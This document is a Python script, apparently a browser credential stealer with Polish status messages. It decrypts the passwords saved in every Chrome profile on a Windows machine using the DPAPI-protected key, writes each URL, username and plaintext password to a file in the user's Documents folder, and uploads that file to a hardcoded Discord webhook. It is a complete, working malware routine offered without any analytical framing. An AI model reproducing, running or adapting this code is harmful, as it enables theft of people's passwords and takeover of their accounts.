
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import requests

def get_encryption_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]  # remove GCM tag
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return "ERROR_DECRYPTING"

def extract_passwords_from_profile(profile_path, key):
    login_db = os.path.join(profile_path, 'Login Data')
    if not os.path.exists(login_db):
        return []

    temp_db = os.path.join(os.getenv('TEMP'), 'Loginvault_temp.db')
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    logins = []

    for row in cursor.fetchall():
        url, username, encrypted_password = row
        if username or encrypted_password:
            password = decrypt_password(encrypted_password, key)
            logins.append((url, username, password))

    cursor.close()
    conn.close()
    os.remove(temp_db)
    return logins

def extract_chrome_passwords(output_file):
    base_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"
    local_state_path = os.path.join(base_path, 'Local State')

    if not os.path.exists(local_state_path):
        with open(output_file, 'w') as f:
            f.write("Local State file not found.\n")
        return

    key = get_encryption_key(local_state_path)
    profiles = ['Default']
    profiles.extend([name for name in os.listdir(base_path) if name.startswith("Profile")])

    all_logins = []
    for profile in profiles:
        profile_path = os.path.join(base_path, profile)
        logins = extract_passwords_from_profile(profile_path, key)
        all_logins.extend(logins)

    with open(output_file, 'w', encoding='utf-8') as f:
        if not all_logins:
            f.write("No passwords found.\n")
        for url, user, pwd in all_logins:
            f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n\n")

def send_to_discord(filepath):
    url = "https://discord.com/api/webhooks/1360942792540684438/8GkVbhnI8fPO6c8yeYN59KLuNAvCem_-50Bef334UkPn_gMrYMA0DWd3RxyliUPq6R8L"
    with open(filepath, 'rb') as f:
        files = {'file': (os.path.basename(filepath), f)}
        response = requests.post(url, files=files)
        if response.status_code == 204:
            print("✅ Plik wysłany na Discorda.")
        else:
            print(f"❌ Błąd wysyłania: {response.status_code} - {response.text}")

if __name__ == '__main__':
    output_path = os.path.join(os.path.expanduser('~'), 'Documents', 'chrome_passwords.txt')
    extract_chrome_passwords(output_path)
    send_to_discord(output_path)
